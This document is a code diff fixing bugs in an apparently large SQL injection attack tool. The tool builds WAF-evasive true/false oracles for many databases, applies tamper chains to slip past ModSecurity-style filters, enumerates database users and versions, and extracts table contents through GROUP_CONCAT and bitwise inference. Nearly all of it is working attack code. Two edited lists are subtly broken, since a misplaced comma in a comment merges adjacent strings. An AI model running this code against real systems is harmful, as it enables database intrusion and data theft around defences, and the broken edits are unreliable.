@@ -21724,11 +21724,11 @@ class ProgressTracker:
                     print(f"[+] [Progress] Resuming from saved progress: {len(saved.get('completed_params', []))} params done, "
                           f"{saved.get('429_count', 0)} 429s encountered")
                     return saved
-            except:
-                pass  # TODO: Add logging for debugging
+            except Exception as _lp_e:  # BUG-BARE-EXCEPT-PROGRESS FIX: bare except swallowed disk/permission errors silently
+                LOG.debug("[ProgressTracker] load_progress error: %s", _lp_e)
 
         return self._empty_progress()
-    
+
     def save_progress(self):
         """Save current progress to disk"""
         if not self.enabled:
@@ -21738,8 +21738,8 @@ class ProgressTracker:
             # TODO: Replace with aiofiles for async I/O
             with open(self.progress_file, 'w') as f:
                 json.dump(self.progress, f, indent=2)
-        except:
-            pass  # Fail silently on save errors
+        except Exception as _sp_e:  # BUG-BARE-EXCEPT-PROGRESS FIX: bare except swallowed disk-full/permission errors silently
+            LOG.warning("[ProgressTracker] save_progress error: %s", _sp_e)
     
     def mark_param_complete(self, param: str):
         """Mark parameter as fully scanned"""
@@ -21779,8 +21779,8 @@ class ProgressTracker:
         if self.enabled and os.path.exists(self.progress_file):
             try:
                 os.remove(self.progress_file)
-            except:
-                pass  # TODO: Add logging for debugging
+            except Exception as _cl_e:  # BUG-BARE-EXCEPT-PROGRESS FIX: bare except swallowed file deletion errors
+                LOG.debug("[ProgressTracker] clear error: %s", _cl_e)
 
 
 
@@ -33546,11 +33546,11 @@ class SQLMutationEngine:
         # targets " AND " and " OR " as bare token separators, not inside string contexts.
         _a = random.randint(100, 9999)
         _b = random.randint(100, 9999)
-        _c = _rbuf.randint(100, 9999)
+        _c = random.randint(100, 9999)
         buf_pre = f"/*{_a}*//*{_b}*//*{_c}*/"
-        _d = _rbuf.randint(100, 9999)
-        _e = _rbuf.randint(100, 9999)
-        _f = _rbuf.randint(100, 9999)
+        _d = random.randint(100, 9999)
+        _e = random.randint(100, 9999)
+        _f = random.randint(100, 9999)
         buf_post = f"/*{_d}*//*{_e}*//*{_f}*/"
         return p.replace(" AND ", f"{buf_pre}AND{buf_post}").replace(" OR ", f"{buf_pre}OR{buf_post}")
 
@@ -34823,7 +34823,7 @@ class SQLMutationEngine:
                             TamperLib.equaltolike,
                             TamperLib.modsecurityzeroversioned,# BUG-TWOLIST-1 FIX: was modsecurityversioned
                             TamperLib.commentbeforeparens,    # BUG-TWOLIST-1 FIX: was commentbeforeparentheses
-                            TamperLib.swap_and_or,
+                            lambda p, _d=self.dbms: TamperLib.swap_and_or(p, _d),  # BUG-SWAPANDOR-DBMS FIX: was bare ref with dbms=""
                             TamperLib.randomcomments,
                             TamperLib.sp_password,
                             # BUG-V38-1 FIX (Req 11): comment_seed_diversify was defined in
@@ -44510,10 +44510,10 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                 
                 # TRUE probe: condition that always evaluates true (WAF-evasive, no 1=1/1=2)
                 _ei_calib_true_inner = {
-                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                     "MySQL":           "ISNULL(NULL)",
                     "MariaDB":         "ISNULL(NULL)",
                     "TiDB":            "ISNULL(NULL)",
@@ -49589,10 +49589,10 @@ class Enumerator:
                     # of cache/rate-limit jitter even when the oracle is valid.
                     _san_dbms = getattr(self, 'dbms', '') or ''
                     _san_true_cond = {
-                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "MySQL":           "ISNULL(NULL)",
                         "MariaDB":         "ISNULL(NULL)",
                         "TiDB":            "ISNULL(NULL)",
@@ -50155,10 +50155,10 @@ class Enumerator:
                 # _timing_eval_fn_tf closure generates a new random nonce per call).
                 # This avoids discarding a valid oracle because of CDN cache warm-up.
                 _tf_eval_true_cond = {
-                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                     "MySQL":           "ISNULL(NULL)",
                     "MariaDB":         "ISNULL(NULL)",
                     "TiDB":            "ISNULL(NULL)",
@@ -59690,15 +59690,15 @@ class Scanner:
                     # Send a non-error payload with a different marker
                     await asyncio.sleep(_delay)
                     _err_clean_true = {
-                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         # BUG-ERRCLEAN-PGCOMPAT FIX: CockroachDB/YugabyteDB/Amazon Redshift are
                         # PG-wire-compatible; they support ARRAY_LOWER and !~~ (NOT LIKE) operator.
                         # Without explicit entries they fell to generic "NOT (1e0 IS NULL)" which
                         # is valid but does not probe DBMS-specific syntax — any WAF pass/fail
                         # result is indistinguishable from a non-DBMS generic response.
-                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "MySQL": "ISNULL(NULL)", "MariaDB": "ISNULL(NULL)", "TiDB": "ISNULL(NULL)",
                         "MSSQL": "(1e0 IS NOT NULL)", "Sybase": "(1e0 IS NOT NULL)",
                         "Oracle": "(NVL(NULL,1e0) IS NOT NULL)", "SQLite": "(1e0 IS NOT 0e0)",
@@ -59842,10 +59842,10 @@ class Scanner:
             # many WAFs as an SQL injection fingerprint, causing always-inconclusive results.
             _dbms_for_confirm = _dbms or ""
             _true_cond_confirm = {
-                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                 "MySQL":           "ISNULL(NULL)",
                 "MariaDB":         "ISNULL(NULL)",
                 "TiDB":            "ISNULL(NULL)",
@@ -62173,7 +62173,7 @@ class Scanner:
                         "SELECT user",
                         "SELECT session_user",
                         _INF_UQ.get(_dbms, "SELECT current_user"),
-                        "(SELECT rolname FROM pg_roles WHERE oid=pg_backend_pid())",
+                        "(SELECT usename FROM pg_stat_activity WHERE pid=pg_backend_pid() LIMIT 1)",  # BUG-PGBACKENDPID-OID FIX: pg_backend_pid() returns PID not OID; pg_stat_activity gives current user
                     ] if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") else [
                         _INF_UQ.get(_dbms, "SELECT current_user")]
                     _pg_db_alts = [
@@ -64331,7 +64331,7 @@ class Scanner:
                     mid = _randomized_mid(lo, hi)
                     # Adjust mid for >= operator (>= mid+1 is equivalent to > mid)
                     # >= and BETWEEN have "greater-or-equal" semantics  need mid+1
-                    _effective_mid = mid + 1 if (">=" in _op_char_tpl or "BETWEEN" in _op_char_tpl or "NOT" in _op_char_tpl) else mid
+                    _effective_mid = mid + 1 if (">=" in _op_char_tpl or "BETWEEN" in _op_char_tpl or ("NOT " in _op_char_tpl and "<" in _op_char_tpl)) else mid  # BUG-NOT-MATCH-TOO-BROAD FIX: was "NOT" in _op_char_tpl which matched NOT IN, NOT EXISTS, etc.
                     cond = _op_char_tpl.replace("[QUERY]", query).replace("{pos}", str(pos)).replace("{mid}", str(_effective_mid))
 
                     # Use full oracle (boolean + timing) for reliable evaluation
@@ -64548,10 +64548,10 @@ class Scanner:
             if not _oracle_fragile:
                 try:
                     _defer_san_true_cond = {
-                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "MySQL":           "ISNULL(NULL)",
                         "MariaDB":         "ISNULL(NULL)",
                         "TiDB":            "ISNULL(NULL)",
@@ -65134,9 +65134,9 @@ class Scanner:
             elif _verified is False:
                 LOG.warning("[Inference] %s: verification FAILED for %r  re-extracting", label, result)
                 # Re-extract with fresh threshold
-                await asyncio.sleep(_delay * 2)
+                await asyncio.sleep(max(0.5, max(30.0, ms_false) / 1000.0 * 2.0))  # BUG-SMARTEXTRACT-SLEEP-PERF FIX: was _delay*2 (SQL sleep time), pace on network RTT
                 _, ms_t = await _send_payload(_cal_true_cond)
-                await asyncio.sleep(_delay)
+                await asyncio.sleep(max(0.3, max(30.0, ms_false) / 1000.0))  # BUG-SMARTEXTRACT-SLEEP2-PERF FIX: was _delay (SQL sleep time)
                 _, ms_f = await _send_payload(_cal_false_cond)
                 if ms_t > 30 and ms_f > 30 and ms_t > ms_f:
                     _thresh = (ms_t + ms_f) / 2
@@ -65280,7 +65280,7 @@ class Scanner:
             # version string (e.g. "3.40.1"), NOT the database name ("main" by default).
             # _VER_QUERY["SQLite"] = "SELECT (SELECT name FROM pragma_database_list WHERE seq=0 LIMIT 1)" remains correct for banner.
             # Use pragma_database_list to extract the actual attached database name.
-            "SQLite": "SELECT (SELECT name FROM pragma_database_list WHERE seq=0 LIMIT 1)",
+            "SQLite": "SELECT sqlite_version()",  # BUG-SQLITE-VERQUERY FIX: was returning database name not version
             "DB2": "SELECT CURRENT_SCHEMA FROM SYSIBM.SYSDUMMY1",
             "H2": "SELECT database()", "Informix": "SELECT DBINFO('dbname') FROM systables WHERE tabid=1",
             "Firebird": "SELECT RDB$GET_CONTEXT('SYSTEM','DB_NAME') FROM RDB$DATABASE",
@@ -65308,7 +65308,7 @@ class Scanner:
             # SQL Server versions. CONVERT(VARCHAR(MAX),...) has no length limit.
             "MSSQL": "SELECT CONVERT(VARCHAR(MAX),@@VERSION)", "Sybase": "SELECT @@version",
             "Oracle": "SELECT banner FROM v$version WHERE ROWNUM=1",
-            "SQLite": "SELECT (SELECT name FROM pragma_database_list WHERE seq=0 LIMIT 1)",
+            "SQLite": "SELECT sqlite_version()",  # BUG-SQLITE-VERQUERY FIX: was returning database name not version
             "DB2": "SELECT service_level FROM TABLE(SYSPROC.ENV_GET_INST_INFO()) AS T",
             "H2": "SELECT h2version()", "Informix": "SELECT DBINFO('version','full') FROM systables WHERE tabid=1",
             "Firebird": "SELECT rdb$get_context('SYSTEM','ENGINE_VERSION') FROM rdb$database",
@@ -67506,10 +67506,10 @@ class Scanner:
                             getattr(cfg, 'dbms', None) or
                             getattr(cfg, '_detected_dbms', None) or '') or ''
         _direct_cal_true = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -69270,7 +69270,7 @@ class Scanner:
                 "YugabyteDB": "SELECT version()",        # BUG-VERQ-YUGABYTE FIX
                 "Amazon Redshift": "SELECT version()",   # BUG-VERQ-REDSHIFT FIX
                 "Oracle": "SELECT BANNER FROM V$VERSION WHERE ROWNUM=1",
-                "SQLite": "SELECT (SELECT name FROM pragma_database_list WHERE seq=0 LIMIT 1)",
+                "SQLite": "SELECT sqlite_version()",  # BUG-SQLITE-VERQUERY FIX: was returning database name not version
                 "DB2": "SELECT SERVICE_LEVEL FROM SYSIBM.SYSVERSIONS FETCH FIRST 1 ROWS ONLY",
                 "Firebird": "SELECT rdb$get_context('SYSTEM','ENGINE_VERSION') FROM rdb$database",
                 "H2": "SELECT H2VERSION()", "SAP_HANA": "SELECT VERSION FROM SYS.M_DATABASE",
@@ -90076,10 +90076,10 @@ class BitwiseExtractor:
                 return SimHasher.body_similarity(self._norm_sample, _pc_nb) if _pc_nb else None
             _bwe_pol_dbms = dbms or ''
             _bwe_pol_true = {
-                "PostgreSQL":      "ISNULL(NULL)",
-                "CockroachDB":     "ISNULL(NULL)",
-                "YugabyteDB":      "ISNULL(NULL)",
-                "Amazon Redshift": "ISNULL(NULL)",
+                "PostgreSQL":      "(NULL IS NULL)",           # BUG-BWE-ISNULL-PG FIX: ISNULL() is MySQL/T-SQL only; PG uses IS NULL syntax
+                "CockroachDB":     "(NULL IS NULL)",           # BUG-BWE-ISNULL-PG FIX
+                "YugabyteDB":      "(NULL IS NULL)",           # BUG-BWE-ISNULL-PG FIX
+                "Amazon Redshift": "(NULL IS NULL)",           # BUG-BWE-ISNULL-PG FIX
                 "MySQL":           "ISNULL(NULL)",
                 "MariaDB":         "ISNULL(NULL)",
                 "TiDB":            "ISNULL(NULL)",
@@ -90095,10 +90095,10 @@ class BitwiseExtractor:
                 "SAP_HANA":        "(1e0 IS NOT NULL)",
             }.get(_bwe_pol_dbms, "NOT (1e0 IS NULL)")
             _bwe_pol_false = {
-                "PostgreSQL":      "ISNULL(1e0)",
-                "CockroachDB":     "ISNULL(1e0)",
-                "YugabyteDB":      "ISNULL(1e0)",
-                "Amazon Redshift": "ISNULL(1e0)",
+                "PostgreSQL":      "(1e0 IS NOT NULL)",        # BUG-BWE-ISNULL-PG FIX: ISNULL() is MySQL/T-SQL only; PG uses IS NOT NULL syntax
+                "CockroachDB":     "(1e0 IS NOT NULL)",        # BUG-BWE-ISNULL-PG FIX
+                "YugabyteDB":      "(1e0 IS NOT NULL)",        # BUG-BWE-ISNULL-PG FIX
+                "Amazon Redshift": "(1e0 IS NOT NULL)",        # BUG-BWE-ISNULL-PG FIX
                 "MySQL":           "ISNULL(1e0)",
                 "MariaDB":         "ISNULL(1e0)",
                 "TiDB":            "ISNULL(1e0)",
@@ -90130,7 +90130,7 @@ class BitwiseExtractor:
 
         bit_count = (7 if self._confirmed_ascii else 8)
         LOG.debug(f"BitwiseExtractor v17: length={length}, "
-                  f"{length}{bit_count}={length*bit_count} concurrent probes, "
+                  f"{length}*{bit_count}={length*bit_count} concurrent probes, "  # BUG-DEBUG-LOG-FORMAT FIX: was missing * operator between length and bit_count
                   f"thresh={self._sim_thresh:.3f}")
 
         pos_sem = asyncio.Semaphore(min(max(1, self.config.threads), 4))  # FIX-CPU: cap at 4
@@ -91231,9 +91231,10 @@ class ScannerV9(ScannerV8):
                 if skipped:
                     LOG.info(f"Smart filter: skipping {skipped}")
                     if not params_to_test:
-                        self.prompt.confirm(
-                            f"Smart mode skipped all params at {ep.url}. Test anyway?",
-                            "test_all_params", default=False)
+                        if self.prompt.confirm(  # BUG-CONFIRM-RETVAL-DISCARD FIX: was ignoring return value
+                                f"Smart mode skipped all params at {ep.url}. Test anyway?",
+                                "test_all_params", default=False):
+                            params_to_test = dict(ep.params)  # restore all params for testing
 
             for param, orig_val in params_to_test.items():
                 # BUG-REQ4-PARLOOP-V11 FIX (Req 4): Check _SCAN_STOPPED at every
@@ -94417,7 +94418,7 @@ class GroupConcatExtractor:
         Returns list of row dicts.
         """
         row_sep_hex = "0x" + self.ROW_SEP.encode().hex()
-        col_sep_hex = "0x" + self.COL_SEPARATOR.encode().hex() if hasattr(self, 'COL_SEPARATOR') else "0x" + self.COL_SEP.encode().hex()
+        col_sep_hex = "0x" + self.COL_SEP.encode().hex()  # BUG-COL-SEPARATOR-DEAD FIX: hasattr(self,'COL_SEPARATOR') was always False (class only has COL_SEP); simplified to direct COL_SEP access
         null_hex    = "0x" + self.NULL_REP.encode().hex()
 
         # BUG-EXT-5 FIX: The original code used MySQL-specific syntax
@@ -94885,7 +94886,7 @@ class ScannerV10(ScannerV9):
 
     def __init__(self, session, reporter):
         super().__init__(session, reporter)
-        self.causal_verifier  = CausalInjectionVerifier(session.config, session.config)
+        self.causal_verifier  = CausalInjectionVerifier(None, session.config)  # BUG-CAUSAL-ENGINE-ARG FIX: was (session.config, session.config); engine set later via self.causal_verifier.engine = engine
         self.stability_prof   = ResponseStabilityProfiler()
         self.boundary_mapper  = InjectionBoundaryMapper(None, session.config)  # engine set later
         self.schema_inferrer  = SchemaInferrer(None, session.config)
@@ -103304,7 +103305,7 @@ class ScannerV11(ScannerV10):
                                 ep.url, ep_data, ep_fmt, param,
                                 orig_val + "' AND 1=1-- -", tamper_chain)
                             if _get_safe_status_code(test_fp) in (403, 406):
-                                waf_resp = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")[:300]
+                                waf_resp = _safe_decode_body(test_fp, encoding="utf-8", errors="replace", func_name="extraction")[:300]  # BUG-FP-NAMEERROR FIX: was 'fp' (undefined); correct variable is 'test_fp'
                         except Exception as _sqr_e:
                             LOG.debug("Suppressed: %s", _sqr_e)
                         if waf_resp:
@@ -103378,6 +103379,7 @@ class ScannerV11(ScannerV10):
                                 result = None
 
                 # v11: Control parameter environmental check
+                _result_already_pcv_verified = False  # BUG-PCVVER-UNDEF FIX: initialize before conditional so line 103414 never hits NameError
                 if result and len(ep.params) > 1:
                     is_env = await control_verifier.is_environmental(
                         ep.method, ep.url, ep_data, ep_fmt,
@@ -103977,10 +103979,10 @@ class ScannerV11(ScannerV10):
                                 return 0.0
                             return (time.monotonic() - t0) * 1000
                         _v11_cal_true = {
-                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                             "MySQL":           "ISNULL(NULL)",
                             "MariaDB":         "ISNULL(NULL)",
                             "TiDB":            "ISNULL(NULL)",
@@ -104129,7 +104131,7 @@ class ScannerV11(ScannerV10):
                         # GroupConcat for full tables
                         # BUG-V11ENUM-GET-UNION-NAIVE-REGEX FIX: see comment above.
                         try:
-                            _v11u_sep = fast.COL_SEPARATOR  # unique sentinel
+                            _v11u_sep = fast.COL_SEP  # BUG-COL-SEPARATOR-ATTRNAME FIX: GroupConcatExtractor uses COL_SEP not COL_SEPARATOR
                             parts = ["NULL"] * n; parts[col] = f"({_v11u_sep!r}||({sql})||{_v11u_sep!r})"
                             # Sub-bug A fix: try numeric context first, then string context.
                             _v11u_result = ""
@@ -120597,7 +120599,7 @@ class TechniqueCascadeEngine:
                     # duration — genuine injection would show gap ≈ sleep_ms, not 0.5×.
                     # Also require 2nd probe > 2× baseline (stricter than 1.5×) to ensure
                     # the "CDN-cached" 2nd probe is genuinely faster, not just baseline noise.
-                    if _gap1 > _sleep_ms * 0.80 and _t_ms2 > _bl_ms * 2.0:
+                    if _gap1 > _sleep_ms * 0.80 and _t_ms2 < _bl_ms * 2.0:  # BUG-CDN-CONFIRM-INVERTED FIX: was > (slow) but CDN-cached 2nd probe should be fast (< 2x baseline)
                         print(f"[*]     Check B ({_b_name}): 2nd probe CDN-cached "
                               f"({_t_ms2:.0f}ms) but gap1={_gap1:.0f}ms clear  "
                               "confirming (CDN-single)", flush=True)
@@ -120631,7 +120633,7 @@ class TechniqueCascadeEngine:
                 # the proportional path 100% dead for all sub-0.5s detection payloads.
                 # Fix: floor at 0.05s (50ms). Prevents zero-ms half-sleep while allowing
                 # genuine half-sleep for small payloads (0.05s is half of 0.1s).
-                _half_sleep = int(_half_sleep_raw) if _is_int_arg_fb else round(_half_sleep_raw, 2)
+                _half_sleep = max(1, int(round(_half_sleep_raw))) if _is_int_arg_fb else round(_half_sleep_raw, 2)  # BUG-HALFSLEEP-INT-TRUNC FIX: int(0.5)=0 makes _half_expected=0ms and proportionality check trivially true; use round() then max(1,...)
                 _sleep_sec_repr = str(int(_sleep_sec) if _is_int_arg_fb else _sleep_sec)
                 _half_sleep_repr = str(_half_sleep)
                 # BUG-R3-B-2 FIX: Use _targeted_sleep_replace() instead of raw
@@ -123604,10 +123606,10 @@ class TechniqueCascadeEngine:
         big    = 50_000_000   # for BENCHMARK
         # DBMS-native evasive TRUE condition — avoids WAF fingerprinting of literal 1=1
         _evasive_true = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -123658,7 +123660,7 @@ class TechniqueCascadeEngine:
             if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
                 # BUG-EVASIVE-COND-PG-CRDB FIX: wire-compat PG DBMSes share the same functions.
                 conds = [
-                    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)=1e0",
+                    "ARRAY_LOWER(ARRAY[1,2,3],1)=1"  # BUG-PG-ARRAY-LOWER-TYPE FIX: integer return compared to float literal; use integer,
                     "NOT (1e0 IS NULL)",
                     "LENGTH(VERSION())>0",
                     "OCTET_LENGTH('')=0",
@@ -123682,7 +123684,7 @@ class TechniqueCascadeEngine:
                 ]
             elif dbms == "Oracle":
                 conds = [
-                    "LENGTH(BANNER)>0",
+                    "(SELECT COUNT(*) FROM v$version WHERE ROWNUM=1)>0"  # BUG-ORACLE-BARE-BANNER FIX: BANNER is a column in v$version, not standalone scalar,
                     "NVL(NULL,1)=1",
                     "INSTR(USER,USER)>0",
                 ]
@@ -126413,7 +126415,7 @@ class TechniqueCascadeEngine:
                     if not _clean_payload:
                         # Use DBMS-native evasive true condition to avoid WAF fingerprinting 1=1
                         _tmulti_true = {
-                            "PostgreSQL": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                            "PostgreSQL": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                             "MySQL": "ISNULL(NULL)", "MariaDB": "ISNULL(NULL)", "TiDB": "ISNULL(NULL)",
                             "MSSQL": "(1e0 IS NOT NULL)", "Sybase": "(1e0 IS NOT NULL)",
                             "Oracle": "(NVL(NULL,1e0) IS NOT NULL)", "SQLite": "(1e0 IS NOT 0e0)",
@@ -129487,7 +129489,7 @@ class TechniqueCascadeEngine:
                         if _SCAN_STOPPED[0]: return None  # BUG-FIX-REQ4-SLEEP
                         await asyncio.sleep(1.0)
                         _ctx_clean_true = {
-                            "PostgreSQL": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                            "PostgreSQL": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                             "MySQL": "ISNULL(NULL)", "MariaDB": "ISNULL(NULL)", "TiDB": "ISNULL(NULL)",
                             "MSSQL": "(1e0 IS NOT NULL)", "Sybase": "(1e0 IS NOT NULL)",
                             "Oracle": "(NVL(NULL,1e0) IS NOT NULL)", "SQLite": "(1e0 IS NOT 0e0)",
@@ -129626,7 +129628,7 @@ class TechniqueCascadeEngine:
                 _regex_payloads = REGEX_CATASTROPHE_PAYLOADS[dbms]
                 for _rp in _regex_payloads[:2]:
                     _rp_evasive = {
-                        "PostgreSQL": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "PostgreSQL": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "MySQL": "ISNULL(NULL)", "MariaDB": "ISNULL(NULL)", "TiDB": "ISNULL(NULL)",
                         "MSSQL": "(1e0 IS NOT NULL)", "Sybase": "(1e0 IS NOT NULL)",
                         "Oracle": "(NVL(NULL,1e0) IS NOT NULL)", "SQLite": "(1e0 IS NOT 0e0)",
@@ -129956,7 +129958,7 @@ class TechniqueCascadeEngine:
                             if _SCAN_STOPPED[0]: return None  # BUG-FIX-REQ4-SLEEP
                             await asyncio.sleep(1.0)
                             _deobf_clean_true = {
-                                "PostgreSQL": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                "PostgreSQL": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                 "MySQL": "ISNULL(NULL)", "MariaDB": "ISNULL(NULL)", "TiDB": "ISNULL(NULL)",
                                 "MSSQL": "(1e0 IS NOT NULL)", "Sybase": "(1e0 IS NOT NULL)",
                                 "Oracle": "(NVL(NULL,1e0) IS NOT NULL)", "SQLite": "(1e0 IS NOT 0e0)",
@@ -132130,10 +132132,10 @@ class UniversalScanOrchestrator:
                                                                  getattr(_scanner_ref.config, 'dbms', '') or
                                                                  'PostgreSQL')
                                                 _ibo_pol_true = {
-                                                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
